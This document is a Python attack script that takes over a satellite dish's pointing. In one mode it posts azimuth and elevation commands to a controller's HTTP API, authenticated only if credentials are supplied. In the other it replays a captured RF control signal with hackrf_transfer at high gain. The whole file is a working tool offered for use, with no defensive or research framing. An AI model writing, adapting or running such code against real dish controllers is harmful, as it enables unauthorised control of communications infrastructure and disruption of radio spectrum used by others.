#!/usr/bin/env python3

import argparse
import subprocess
import time
import os
import requests

def send_ip_override(target_ip, azimuth, elevation, auth=None):
    print(f"[+] Sending dish alignment override to {target_ip} [Az: {azimuth}, El: {elevation}]")
    payload = {
        "az": azimuth,
        "el": elevation
    }
    headers = {"Content-Type": "application/json"}
    try:
        if auth:
            r = requests.post(f"http://{target_ip}/api/control/point", json=payload, headers=headers, auth=auth, timeout=5)
        else:
            r = requests.post(f"http://{target_ip}/api/control/point", json=payload, headers=headers, timeout=5)
        if r.status_code == 200:
            print("[+] Command accepted by dish controller")
        else:
            print(f"[!] Controller returned status {r.status_code}: {r.text}")
    except requests.RequestException as e:
        print(f"[!] Failed to reach dish controller: {e}")

def replay_rf_signal(signal_file, frequency):
    print(f"[+] Replaying RF control signal from {signal_file} on {frequency/1e6:.2f} MHz")
    command = [
        "hackrf_transfer",
        "-t", signal_file,
        "-f", str(frequency),
        "-x", "40",
        "-s", "2000000",
        "-a", "1"
    ]
    subprocess.run(command, check=True)

def main():
    parser = argparse.ArgumentParser(description="Override satellite dish aim via IP or RF replay")
    parser.add_argument("--mode", choices=["ip", "rf"], required=True, help="Override mode (ip or rf)")
    
    # IP mode args
    parser.add_argument("--target-ip", help="Target controller IP (for IP mode)")
    parser.add_argument("--azimuth", type=int, help="Desired azimuth angle")
    parser.add_argument("--elevation", type=int, help="Desired elevation angle")
    parser.add_argument("--auth-user", help="Username for HTTP Basic Auth")
    parser.add_argument("--auth-pass", help="Password for HTTP Basic Auth")
    
    # RF mode args
    parser.add_argument("--signal-file", help="Raw RF signal file (.iq) for replay")
    parser.add_argument("--frequency", type=int, help="Replay frequency in Hz (RF mode)")

    args = parser.parse_args()

    if args.mode == "ip":
        if not (args.target_ip and args.azimuth is not None and args.elevation is not None):
            print("[!] IP mode requires --target-ip, --azimuth, and --elevation")
            return
        auth = (args.auth_user, args.auth_pass) if args.auth_user and args.auth_pass else None
        send_ip_override(args.target_ip, args.azimuth, args.elevation, auth)

    elif args.mode == "rf":
        if not (args.signal_file and args.frequency):
            print("[!] RF mode requires --signal-file and --frequency")
            return
        replay_rf_signal(args.signal_file, args.frequency)

if __name__ == "__main__":
    main()
